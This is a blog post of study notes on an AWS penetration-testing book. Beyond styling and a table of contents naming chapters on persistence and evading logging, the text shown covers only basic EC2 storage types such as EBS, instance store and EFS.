---
layout: post
title:  Hands on AWS Penetration Testing Notes
description: These are my notes for the Hands on AWS Penetration Testing book by Benjamin Caudill and Karl Gilbert.
date:   2022-09-11 
image:  '/images/hands_on_aws_pentesting.jpg'
tags:   [Notes, Bypass, GuardDuty, Privesc ]
---

<style>
.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	

</style><body><article id="dddff3ee-2f87-4167-8423-bb35d276f7dd" class="page sans"><header><h1 class="page-title">Hands on AWS Penetration Testing</h1></header><div class="page-body">

The PDF version of these notes can be found [here](/misc/Hands_on_AWS_Penetration_Testing.pdf).
<br>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#8e4e44f9-a9fb-483e-a534-8dd55ee805ab">Table of Contents</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#853e9941-f331-4cac-b759-4c7ffe7ccef5">Chapter 4: Setting up EC2 Instance</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#0f42d58c-2059-4ea5-a69d-2f8afb3daac1">Storage Types Used in EC2 Instances</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#83e16bf6-4b46-45ce-a2ac-2b59ab51cb2c">Elastic Block Storage</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#8b3f71af-73e3-407f-b716-49cd0fd6f026">EC2 Instance Store</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#529761f6-3886-4174-b9f2-63a54fa73ba0">Elastic FileSystem (EFS)</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#2ab9fe29-1fc8-488c-8184-113ccb5a5e05">S3</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#988dfe9f-9fae-4267-9126-d391fe5f7fca">General Purpose SSD Volumes (GP2)</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#4fd74193-302b-4bf3-ae27-2094efd0b270">Provisioned IOPS SSD (I01) Volumes</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#99f4f52c-9d61-443a-8c83-0969f52d4e54">EC2 Firewall Settings</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#b3ab7e2e-936e-48b9-a709-dfce35f03e77">Chapter 6: Elastic Block Stores and Snapshots - Retrieving Deleted Data</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#3c07c6e0-2d54-4c9a-b225-e1a30d754fc2">EBS Volume Types and Encryption</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#77a1df54-aa9f-4cd0-a4e1-2516f4e02ed4">Chapter 7: Identifying Vulnerable S3 Buckets</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#d983cb8d-48ee-4efe-a311-9f9d85950157">S3 Permissions and the Access API</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#678a5c83-21fa-4913-be51-19fae45fb817">ACPs / ACLs</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#594ba3c7-bdcb-4c1a-92f6-e750fcbfd5ea">Bucket Policy</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#b8f75651-6856-452a-90bd-2716aa8f20f5">Chapter 8: Exploiting S3 Buckets</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#7d5494c1-c186-4219-80e2-0ff334493c44">Backdooring S3 Buckets for Persistence</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#5acfa147-39ef-4569-a034-9b7126113126">Bucket Hijack</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#87725274-3a1b-4c31-88ed-16209f53ac7f">Chapter 9: IAM </a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#11836c93-c0ab-4928-803e-ef356b37ff95">Roles and Groups</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#50823fea-b38a-453d-8417-4e785f16ff01">Roles</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#be7188d0-18ae-4220-bb4a-82569f7f6f66">Groups</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#e5a3ecac-9e7b-449d-af26-a3d4b28a4968">API Request Signing</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#544e9aae-74e6-4c0e-bd14-54af8be5f40a">Chapter 10: Privesc, Boto3, and Pacu</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#3b7b2b50-ef00-4db2-a171-db4de6b4c711">Boto3</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#bbae1bb3-dad6-4bf2-80a2-52638f707db7">Chapter 11: Persistence</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#44aed29a-4b14-41c7-8f59-47d3c280d6e8">Backdooring Users</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#d68f7725-b5a4-4baa-9b08-025158cf2c60">Create Another Access Key Pair</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#6f7f5b39-04cc-46c2-b789-0ea4b1c4551f">Backdooring Role Trust Relationships</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#f622b0de-95e4-4414-a679-d0dab4652846">IAM Trust Policy</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#8a359df3-ca92-4c43-8dff-97a07e716cd4">Adding Backdoor to Trust Policy</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#72231594-f1de-48a3-968b-a23e35d5dd1b">Backdooring EC2 Security Groups</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#824eae1d-356e-4300-9382-3c99a4c922d1">Backdooring Lambda Function</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#00b533e8-047d-4e1f-938d-2994f649652e">Backdooring ECR</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#c27ae794-0a9f-419f-a5ec-f38048763818">Chapter 12: Pentesting Lambda</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#0401dea5-703f-42d5-9c0f-01e46a60a462">Event Injection</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#bf7b4a28-7320-41d9-8951-9fe961258311">Lambda Malicious Code</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#5022f87c-d43a-44f2-8b49-857db225c5d1">Chapter 14: Targeting Other Services</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#1ec2c8fe-c487-4f86-9df9-88687e4f5775">Route 53</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#4986a9c7-dc27-432b-a690-04d74da4653f">How Malicious Attackers Exploit Route53</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#83de59df-0f89-48a0-a908-4b4225ca6bf1">Simple Email Service (SES)</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#2054acd0-5ce6-4ebd-9ae8-83fa13b8bd99">CloudFormation</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#6a8a7193-151d-4644-a417-1b7e6e94c4b8">Stack Parameters</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#b46d740e-f9de-4edb-898c-b1dab7b4977f">Stack Output Values</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#aa105aaa-d64f-4db8-9188-03e1dd66e880">Stack Termination Protection</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#78b59128-9d3a-452f-b1c1-c26041a7aa9b">Deleted Stacks</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#d6e35598-1622-4d88-9d97-52ff25157dd0">Stack Exports</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#d40e19e2-8f22-4c24-bcfb-c1ba4fbdd8e9">Stack Templates</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#1d267d7a-9b31-41ba-9994-ca796b4b6b4e">Passed Roles</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#cbd3483d-84fe-466b-9ef9-1c79f11cad0e">Discovering values of NoEcho Parameters</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#15ff50bf-22a4-4438-bae7-b49dda5fb022">Elastic Container Registry (ECR)</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#51498d5b-d478-4ec0-9632-96483456aadc">Chapter 15: Pentesting CloudTrail</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#2696625f-5ab0-471d-88ed-2d5161c16a52">Auditing</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#b0e11bc7-4b4b-4f67-9ec4-d02b7df4d020">Recon</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#84d246fe-bf2a-48cf-9c79-032f2febb934">Bypassing Logging</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#ab180c25-2046-4d82-9d2e-7d62cd68705a">Using Unsupported Services</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#3082cb73-0c1d-4233-abcd-fc9fbb65fcba">Cross-Account Enumeration</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#cd9f01bc-4018-4497-b9f6-76fb62ac3cc8">Disrupting Trails</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#55f34295-1dc8-4824-b4e8-0ee6d7a977af">Disabling a Trail</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#971a127f-8eac-4646-8ce7-12dac3ba76c5">Deleting a Trail or its S3 Bucket</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#dba2b150-e667-44d6-8215-b5d3c51ed40f">Weakening a Trail or its S3 Bucket</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#8e6a7be0-dc93-4d38-ae1a-931d3d2df94d">Bypassing GuardDuty</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#abfec2b4-0f84-4cf1-a109-99ad745954e0">Chapter 16: GuardDuty</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#a7b1f207-df30-4a90-9857-fb049bbc180c">Bypassing Techniques</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#7ae29c7e-8339-4570-a111-adaf4a31eb02">Distraction</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#82784f17-4f27-4d36-8c81-a8e2f09bf58f">Disabling Monitoring</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#54d70738-6f6d-45db-b321-f81a153c5a47">Whitelisting</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#321d8476-5a88-426d-be08-ce5bf58aebc6">Bypassing EC2 Credential Exfiltration Alerts</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#5388de65-639f-4879-95a2-bc63e742ab1f">Other Bypasses</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#910c4c69-bd26-4a03-bf29-c1e087038319">Chapter 19: Real World AWS Pentesting</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#3c270fba-053c-413d-81c4-550b8f7d87dc">Unauthenticated Reconnaissance</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#a31998e6-baab-4cc5-b542-84b42b1a4854">Pacu</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#9ace7f93-753f-4a62-b2f6-ab4286872367">Post-Exploitation</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#6c1876cd-07f1-41d9-b569-495aa2f44df1">EC2</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#c7cae29f-cabe-4563-aebc-3c46ab83a73c">EBS</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#dadb7a14-e04c-4cf9-a319-aae020b20b41">Lambda</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-2">
<a class="table_contents-link" href="#7ec33ad5-f36b-46c2-8b94-05ba11771ceb">RDS</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-1">
<a class="table_contents-link" href="#dae24093-d7d7-4c9e-9c43-f744838e3c0d">Auditing for Compliance and Best Practices</a>
</div>
<div class="table_of_contents-item table_of_contents-indent-0">
<a class="table_contents-link" href="#f657b434-e280-49b2-8831-9b1a045d6c01">Tools</a>
</div>

<h1 id="853e9941-f331-4cac-b759-4c7ffe7ccef5" class="">Chapter 4: Setting up EC2 Instance</h1>
<h2 id="0f42d58c-2059-4ea5-a69d-2f8afb3daac1" class="">Storage Types Used in EC2 Instances</h2><ul id="97ebe36f-dbf4-49e0-b36d-760d00b92fac" class="bulleted-list"><li style="list-style-type:disc">note that there are many different types of storage types, but these are the main ones:</li></ul>
<h3 id="83e16bf6-4b46-45ce-a2ac-2b59ab51cb2c" class="">Elastic Block Storage</h3><ul id="bbe2032d-d6c2-4f4c-a8e9-3f3162aa5cc2" class="bulleted-list"><li style="list-style-type:disc">high-speed storage volumes<ul id="82878a39-02e0-4ca5-8aac-91bfd520e14a" class="bulleted-list"><li style="list-style-type:circle">best suited for high-speed and frequent data writes and reads</li></ul></li></ul><ul id="e2e5200e-1148-455a-b1fe-f67fca39db68" class="bulleted-list"><li style="list-style-type:disc">these volumes can persist even after EC2 instance destroyed</li></ul><ul id="fb86f079-7d2c-49b5-8bad-12b619492c90" class="bulleted-list"><li style="list-style-type:disc">snapshot of EBS volume can be created</li></ul>
<h3 id="8b3f71af-73e3-407f-b716-49cd0fd6f026" class="">EC2 Instance Store</h3><ul id="8a9c2b55-cff0-4df5-abf4-179cf889df50" class="bulleted-list"><li style="list-style-type:disc">used for storing data temporarily</li></ul><ul id="f93f62f1-4b52-4c04-bf37-670f14ddff75" class="bulleted-list"><li style="list-style-type:disc">physically attached to host computer</li></ul><ul id="d6212851-38c8-46e6-8de5-aed12c1bce7e" class="bulleted-list"><li style="list-style-type:disc">lost if EC2 instance is destroyed</li></ul>
<h3 id="529761f6-3886-4174-b9f2-63a54fa73ba0" class="">Elastic FileSystem (EFS)</h3><ul id="de1d75a7-2711-454b-97d2-7f36feb89698" class="bulleted-list"><li style="list-style-type:disc">can only be used with Linux-based EC2 instance</li></ul><ul id="d59d40a2-041a-492e-8c8a-f582f1f8de73" class="bulleted-list"><li style="list-style-type:disc">can be used as a common data source<ul id="07f21dea-2b7b-4ef5-b780-d3ebc4a67ca9" class="bulleted-list"><li style="list-style-type:circle">can be used simultaneously by multiple EC2 instance</li></ul></li></ul>
